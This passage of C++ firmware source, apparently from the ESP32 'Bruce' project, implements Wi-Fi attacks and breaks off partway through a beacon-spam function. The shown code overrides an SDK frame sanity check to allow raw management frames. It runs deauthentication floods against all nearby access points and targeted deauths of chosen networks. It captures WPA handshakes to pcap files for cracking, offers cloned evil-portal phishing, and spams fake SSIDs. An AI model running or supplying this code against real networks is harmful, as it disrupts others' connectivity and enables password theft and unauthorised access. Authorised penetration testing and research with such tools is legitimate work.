// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions:
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
// C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
#include "wifi_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "evil_portal.h"
#include "sniffer.h"
#include "vector"
#include <Arduino.h>
#include <globals.h>
#include <nvs_flash.h>

#define WIFI_ATK_NAME "BruceAttack"
extern bool showHiddenNetworks;

std::vector<wifi_ap_record_t> ap_records;
/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]

wifi_ap_record_t ap_record;

// Beacon packet template
// clang-format off
constexpr size_t BEACON_PKT_LEN = 109;
const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02,  0x03, 0x04, 0x05, 0x06, // Source (placeholder - overwritten)
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (placeholder - overwritten)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (SDK will set)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
    /* 34 - 35 */ 0x31, 0x00, // Capability info (will set WPA flag later)
    /* 36 - 37 */ 0x00, 0x20,         // Tag: SSID parameter set, tag length 32 (we will write SSID into bytes 38..69)
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
    /* 70 - 71 */ 0x01, 0x08, // Supported rates tag length 8
    /* 72 */ 0x82,
    /* 73 */ 0x84,
    /* 74 */ 0x8b,
    /* 75 */ 0x96,
    /* 76 */ 0x24,
    /* 77 */ 0x30,
    /* 78 */ 0x48,
    /* 79 */ 0x6c,
    /* 80 - 81 */ 0x03, 0x01,          // Current Channel tag
    /* 82 */ 0x01, // Current channel (overwritten)
    /* 83 - 84 */ 0x30, 0x18, // RSN information (start)
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};
// clang-format on
static inline void prepareBeaconPacket(
    uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
    uint8_t channel, bool setWPAflag = true
) {
    // copy template into a packet
    memcpy(outPacket, beaconPacketTemplate, BEACON_PKT_LEN);

    // write MAC addresses (source and BSSID)
    memcpy(&outPacket[10], macAddr, 6); // Source
    memcpy(&outPacket[16], macAddr, 6); // BSSID

    // ensure SSID slot is cleared (32 bytes) then copy SSID
    memset(&outPacket[38], 0x20, 32); // keep template behavior
    if (ssidLen > 32) ssidLen = 32;
    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }

    // set channel and WPA flags
    outPacket[82] = channel;
    outPacket[34] = 0x31;
}

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
    if (nChannels == 0) return;
    channelIndex = (channelIndex + 1) % nChannels;
    uint8_t ch = channels[channelIndex];
    if (ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

/***************************************************************************************
** Function: send_raw_frame
** @brief: Broadcasts deauth frames
***************************************************************************************/
void send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
}

/***************************************************************************************
** function: wsl_bypasser_send_raw_frame
** @brief: prepare the frame to deploy the attack
***************************************************************************************/
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
    Serial.print("\nPreparing deauth frame to AP -> ");
    for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
    }
    Serial.print(" and Tgt: ");
    for (int j = 0; j < 6; j++) {
        Serial.print(target[j], HEX);
        if (j < 5) Serial.print(":");
    }

    esp_err_t err;
    err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) Serial.println("Error changing channel");
    vTaskDelay(50 / portTICK_PERIOD_MS);
    memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
}

/***************************************************************************************
** function: wifi_atk_info
** @brief: Open Wifi information screen
***************************************************************************************/
void wifi_atk_info(String tssid, String mac, uint8_t channel) {
    // desenhar a tela
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
    tft.drawString("AP: " + tssid, 10, 48);
    tft.drawString("Channel: " + String(channel), 10, 66);
    tft.drawString(mac, 10, 84);
    tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
    vTaskDelay(200 / portTICK_PERIOD_MS);
    SelPress = false;

    while (1) {
        if (check(SelPress)) {
            returnToMenu = false;
            return;
        }
        if (check(EscPress)) {
            returnToMenu = true;
            return;
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}
/***************************************************************************************
** function: wifi_atk_setWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_setWifi() {
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            displayError("Failed starting WIFI", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
        if (!WiFi.softAP(WIFI_ATK_NAME, emptyString, 1, 1, 4, false)) {
            displayError("Failed starting  AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return true;
}

/***************************************************************************************
** function: wifi_atk_unsetWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_unsetWifi() {
    if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
        if (!WiFi.softAPdisconnect()) {
            displayError("Failed Stopping AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) wifiDisconnect();

    return true;
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void wifi_atk_menu() {
    bool scanAtks = false;
    options = {
        {"Target Atks",  [&]() { scanAtks = true; }    },
        {"Beacon SPAM",  [=]() { beaconAttack(); }     },
        {"Deauth Flood", [=]() { deauthFloodAttack(); }},
    };
    addOptionToMainMenu();
    loopOptions(options);
    if (!returnToMenu) {
        if (!wifi_atk_setWifi()) return; // Error messages inside the function
    }
    if (scanAtks) {
        int nets;
        displayTextLine("Scanning..");
        // include hidden networks in the scan depending on toggle
        nets = WiFi.scanNetworks(false, showHiddenNetworks);
        ap_records.clear();
        options = {};
        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memset(&record, 0, sizeof(record));
            // copy bssid
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            // copy channel/primary
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            // copy authmode
            record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
            // copy ssid bytes into record.ssid (if supported by struct)
            // Ensure safe copy (wifi_ap_record_t typically has ssid[32])
            if (strlen(WiFi.SSID(i).c_str()) > 0) {
                strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
                record.ssid[sizeof(record.ssid) - 1] = '\0';
            } else {
                // empty -> leave zeroed or explicit empty string
                record.ssid[0] = '\0';
            }

            ap_records.push_back(record);

            String ssid = WiFi.SSID(i);
            int encryptionType = WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);
            int32_t ch = WiFi.channel(i);
            String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
            String encryptionTypeStr;
            switch (encryptionType) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }

            // if SSID is empty -> indicate hidden
            String displaySSID = ssid;
            if (displaySSID.length() == 0) {
                // show the BSSID so user can recognize it
                displaySSID = "<Hidden SSID> " + WiFi.BSSIDstr(i);
            }

            String optionText = encryptionPrefix + displaySSID + " (" + String(rssi) + "|" +
                                encryptionTypeStr + "|ch." + String(ch) + ")";

            options.push_back({optionText.c_str(), [=]() {
                                   ap_record = ap_records[i];
                                   target_atk_menu(
                                       WiFi.SSID(i).c_str(),
                                       WiFi.BSSIDstr(i),
                                       static_cast<uint8_t>(WiFi.channel(i))
                                   );
                               }});
        }

        addOptionToMainMenu();

        loopOptions(options);
        options.clear();
    }
    wifi_atk_unsetWifi();
}
void deauthFloodAttack() {
    if (!wifi_atk_setWifi()) return; // error messages inside the function

    int nets;
ScanNets:
    displayTextLine("Scanning..");
    // include hidden networks in the scan depending on toggle
    nets = WiFi.scanNetworks(false, showHiddenNetworks);
    ap_records.clear();
    for (int i = 0; i < nets; i++) {
        wifi_ap_record_t record;
        memset(&record, 0, sizeof(record));
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = static_cast<uint8_t>(WiFi.channel(i));
        // copy ssid bytes too
        if (strlen(WiFi.SSID(i).c_str()) > 0) {
            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
            record.ssid[sizeof(record.ssid) - 1] = '\0';
        } else {
            record.ssid[0] = '\0';
        }
        ap_records.push_back(record);
    }
    // Prepare deauth frame for each AP record
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescan_counter = millis();
    uint16_t count = 0;
    uint8_t channel = 0;
    drawMainBorderWithTitle("Deauth Flood");
    while (true) {
        for (const auto &record : ap_records) {
            channel = record.primary;
            wsl_bypasser_send_raw_frame(&record, record.primary); // Sets channel to the same AP
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(record.primary) + "    ");
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        // Update counter every 2 seconds
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Deauth Flood");
            tft.setCursor(10, tftHeight - 25);
            tft.print("Frames:               ");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(channel) + "    ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescan_counter > 60000) goto ScanNets; // re-scan networks for more relability

        if (check(EscPress)) break;
    }
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

/***************************************************************************************
** function: capture_handshake
** @brief: Capture handshake for a selected network
**          (redraws only when deauth is sent or when a handshake/EAPOL is captured)
***************************************************************************************/
uint8_t targetBssid[6]; // Just the target AP MAC to pass onto sniff.cpp to filter out EAPOL frames of
                        // unrelated APs

void capture_handshake(String tssid, String mac, uint8_t channel) {

    hsTracker = HandshakeTracker(); // Reset tracker for each new capture

    uint8_t bssid_array[6];
    sscanf(
        mac.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &bssid_array[0],
        &bssid_array[1],
        &bssid_array[2],
        &bssid_array[3],
        &bssid_array[4],
        &bssid_array[5]
    );

    // Set the target record for deauth
    memcpy(ap_record.bssid, bssid_array, 6);
    memcpy(targetBssid, bssid_array, 6);
    ap_record.primary = channel;

    String encryptionTypeStr = "Unknown";
    for (int i = 0; i < ap_records.size(); i++) {
        if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
            switch (ap_records[i].authmode) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }
            break;
        }
    }

    // Sanitize SSID for use in filename
    String sanitizedSsid = "";
    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
        char c = tssid[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
            c == '_' || c == '.') {
            sanitizedSsid += c;
        } else {
            sanitizedSsid += '_';
        }
    }
    // If SSID was hidden/empty, use BSSID appended to filename so it's unique and descriptive
    if (sanitizedSsid.length() == 0) {
        char bssidHex[32];
        sprintf(
            bssidHex,
            "%02X%02X%02X%02X%02X%02X",
            bssid_array[0],
            bssid_array[1],
            bssid_array[2],
            bssid_array[3],
            bssid_array[4],
            bssid_array[5]
        );
        sanitizedSsid = String("HIDDEN_") + String(bssidHex);
    }

    char hsFileName[128];
    sprintf(
        hsFileName,
        "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
        bssid_array[0],
        bssid_array[1],
        bssid_array[2],
        bssid_array[3],
        bssid_array[4],
        bssid_array[5],
        sanitizedSsid.c_str()
    );

    bool hsExists = false;
    bool captured = false;
    FS *fs;
    if (setupSdCard()) {
        fs = &SD;
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP/handshakes")) {
            SD.mkdir("/BrucePCAP");
            SD.mkdir("/BrucePCAP/handshakes");
        }
        hsExists = SD.exists(hsFileName);
    } else {
        fs = &LittleFS;
        isLittleFS = true;
        if (!LittleFS.exists("/BrucePCAP/handshakes")) {
            LittleFS.mkdir("/BrucePCAP");
            LittleFS.mkdir("/BrucePCAP/handshakes");
        }
        hsExists = LittleFS.exists(hsFileName);
    }

    // Register the file path so the sniffer knows to save the capture to it
    String hsFilePath = String(hsFileName);
    if (!hsExists) {
        File hsFile = fs->open(hsFileName, FILE_WRITE);
        if (hsFile) {
            writeHeader(hsFile);
            hsFile.close();
            // Register using the file path
            SavedHS.insert(hsFilePath);
            // Mark as ready to capture
            uint64_t apKey = 0;
            for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
            markHandshakeReady(apKey);
            Serial.println("Created new handshake file for target AP");
            Serial.print("Target BSSID: ");
            for (int i = 0; i < 6; i++) {
                Serial.printf("%02X", bssid_array[i]);
                if (i < 5) Serial.print(":");
            }
            Serial.println();
            Serial.println("Added to SavedHS set for beacon capture");
        } else {
            Serial.println("Failed to create handshake file");
        }
    } else {
        // File already exists: Add to SavedHS and mark as captured
        SavedHS.insert(hsFilePath);
        uint64_t apKey = 0;
        for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
        markHandshakeReady(apKey);
        captured = true;
        Serial.println("Handshake file already exists");
    }

    if (!wifi_atk_setWifi()) return; // error messages inside the function

    // Initialize sniffer backend
    if (!sniffer_prepare_storage(fs, !isLittleFS)) {
        displayError("Sniffer queue error", true);
        return;
    }

    ch = channel;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(channel, secondCh);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    int deauthCount = 0;
    int initialNumEAPOL = num_EAPOL;
    int prevNumEAPOL = initialNumEAPOL;
    bool hasBeacons = false;
    bool hasEAPOL = false;

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);

    // only redraw when we explicitly need to (deauth sent or handshake captured)
    bool needRedraw = true; // draw once on entry

    while (true) {
        // Check if we have beacons
        BeaconList targetBeacon;
        memcpy(targetBeacon.MAC, bssid_array, 6);
        targetBeacon.channel = channel;
        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) { hasBeacons = true; }

        // Redraw whenever new EAPOL Frame arrives
        if (num_EAPOL > prevNumEAPOL) {
            prevNumEAPOL = num_EAPOL;
            needRedraw = true;
        }

        // Mark handshake captured only when we have useable EAPOL Frame pairs
        if (handshakeUsable(hsTracker)) {
            hasEAPOL = true;
            captured = true;
        }

        if (needRedraw) {
            drawMainBorderWithTitle("Handshake Capture");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("");
            padprintln("SSID: " + tssid);
            padprintln("BSSID: " + mac);
            padprintln("Security: " + encryptionTypeStr);
            padprintln("");

            // Show console status
            if (hasBeacons && handshakeUsable(hsTracker)) {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                padprintln("Status: CAPTURED!");
                padprintln("");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else if (hasBeacons) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Beacon captured");
                padprintln("");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Waiting...");
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            }

            padprintln("");
            padprintln("Deauth sent: " + String(deauthCount));
            padprintln("");
            tft.drawRightString(
                "Press " + String(BTN_ALIAS) + " to send deauth", tftWidth - 10, tftHeight - 35, 1
            );
            tft.drawString("Press Back to exit", 10, tftHeight - 20);

            // reset redraw flag
            needRedraw = false;
        }

        // If user presses the select button -> send deauth and request redraw
        if (check(SelPress)) {
            wsl_bypasser_send_raw_frame(&ap_record, channel);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
            deauthCount += 5;
            needRedraw = true; // show updated deauth counter
        }

        // Exit condition
        if (check(EscPress)) { break; }

        // small yield so other tasks can run; keeps responsiveness without constant redraw
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void target_atk_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
        {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
        {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
        {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
        {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
        {"Deauth+Clone+Verify",
         [=]() // New WiFi Attack
         { EvilPortal(tssid, channel, true, true); }                               },
    };
    addOptionToMainMenu();

    loopOptions(options);
    if (!returnToMenu) goto AGAIN; // get back from Information without overflow the stack
}

/***************************************************************************************
** function: target_atk
** @brief: Deploy Target deauth
***************************************************************************************/
void target_atk(String tssid, String mac, uint8_t channel) {

    if (!wifi_atk_setWifi()) return; // error messages inside the function

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, channel);

    // loop com o ataque mostrando o numero de frames por segundo
    uint32_t tmp = 0;
    uint16_t count = 0;
    tmp = millis();
    bool redraw = true;
    check(SelPress);

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);
    setCpuFrequencyMhz(240);
    while (1) {
        if (redraw) {
            // desenhar a tela
            drawMainBorderWithTitle("Target Deauth");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("");
            padprintln("AP: " + tssid);
            padprintln("Channel: " + String(channel));
            padprintln(mac);
            vTaskDelay(50 / portTICK_PERIOD_MS);
            redraw = false;
        }
        // Send frame
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        count += 3; // the function above sends 3 frames each time
        // atualize counter
        if (millis() - tmp > 2000) {
            tft.setCursor(15, tftHeight - 23);
            tft.print("Frames: " + String(count / 2) + "/s");
            count = 0;
            tmp = millis();
        }
        // Pause attack
        if (check(SelPress)) {
            displayTextLine("Deauth Paused");
            // wait to restart or kick out of the function
            while (!check(SelPress)) {
                if (check(EscPress)) break;
            }
            redraw = true;
        }
        // Checks para sair do while
        if (check(EscPress)) break;
    }
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

void generateRandomWiFiMac(uint8_t *mac) {
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7; // Generate a random length between 1 and 10
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)]; // S elect random characters from the charset
    }
    randomName[len] = '\0'; // Null-terminate the string
    return randomName;
}

char emptySSID[32];
const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                "Abraham Linksys\n"
                                "Benjamin FrankLAN\n"
                                "Martin Router King\n"
                                "John Wilkes Bluetooth\n"
                                "Pretty Fly for a Wi-Fi\n"
                                "Bill Wi the Science Fi\n"
                                "I Believe Wi Can Fi\n"
                                "Tell My Wi-Fi Love Her\n"
                                "No More Mister Wi-Fi\n"
                                "LAN Solo\n"
                                "The LAN Before Time\n"
                                "Silence of the LANs\n"
                                "House LANister\n"
                                "Winternet Is Coming\n"
                                "Ping's Landing\n"
                                "The Ping in the North\n"
                                "This LAN Is My LAN\n"
                                "Get Off My LAN\n"
                                "The Promised LAN\n"
                                "The LAN Down Under\n"
                                "FBI Surveillance Van 4\n"
                                "Area 51 Test Site\n"
                                "Drive-By Wi-Fi\n"
                                "Planet Express\n"
                                "Wu Tang LAN\n"
                                "Darude LANstorm\n"
                                "Never Gonna Give You Up\n"
                                "Hide Yo Kids, Hide Yo Wi-Fi\n"
                                "Loading…\n"
                                "Searching…\n"
                                "VIRUS.EXE\n"
                                "Virus-Infected Wi-Fi\n"
                                "Starbucks Wi-Fi\n"
                                "Text 64ALL for Password\n"
                                "Yell BRUCE for Password\n"
                                "The Password Is 1234\n"
                                "Free Public Wi-Fi\n"
                                "No Free Wi-Fi Here\n"
                                "Get Your Own Damn Wi-Fi\n"
                                "It Hurts When IP\n"
                                "Dora the Internet Explorer\n"
                                "404 Wi-Fi Unavailable\n"
                                "Porque-Fi\n"
                                "Titanic Syncing\n"
                                "Test Wi-Fi Please Ignore\n"
                                "Drop It Like It's Hotspot\n"
                                "Life in the Fast LAN\n"
                                "The Creep Next Door\n"
                                "Ye Olde Internet\n"};

const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                      "02 Never gonna let you down\n"
                                      "03 Never gonna run around\n"
                                      "04 and desert you\n"
                                      "05 Never gonna make you cry\n"
                                      "06 Never gonna say goodbye\n"
                                      "07 Never gonna tell a lie\n"
                                      "08 and hurt you\n"};

void beaconSpamList(const char list[]) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int i = 0;
    int ssidsLen = strlen_P(list);

    // go to the next channel
    nextChannel();

    while (i < ssidsLen) {
        // Read next SSID from PROGMEM up to newline
        char ssidBuf[32];
        int j = 0;
        char tmp;
        // read chars from PROGMEM until newline
        do {
            tmp = pgm_read_byte(list + i + j);
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : j - 1;

        // generate MAC and prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);

        // send 2 packets instead of 3 (makes devices show more networks)
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        // move cursor past the SSID and newline
        i += j;
        if (EscPress) break;
    }
}

void beaconSpamSingle(String baseSSID) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int counter = 1;

    // initial channel rotation
    nextChannel();

    while (true) {
        // Create SSID with suffix (within 32 limit)
        String currentSSID = baseSSID + String(counter);
        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
        uint8_t ssidLen = currentSSID.length();

        // prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);

        // send 2 packets
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        counter++;
        if (counter > 9999) {
            counter = 1;
            nextChannel(); // change channel after resetting the counter
        }
        if (EscPress) break; // exit condition preserved
    }
}

void beaconAttack() {
    if (!wifi_atk_setWifi()) return; // error messages inside the function

    int BeaconMode;
    String txt = "";
    String singleSSID = "";
    // create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    // for random generator
    randomSeed(1);
    options = {
        {"Funny SSID",
         [&]() {
             BeaconMode = 0;
             txt = "Spamming Funny";
         }                        },
        {"Ricky Roll",
         [&]() {
             BeaconMode = 1;
             txt = "Spamming Ricky";
         }                        },
        {"Random SSID",
         [&]() {
             BeaconMode = 2;
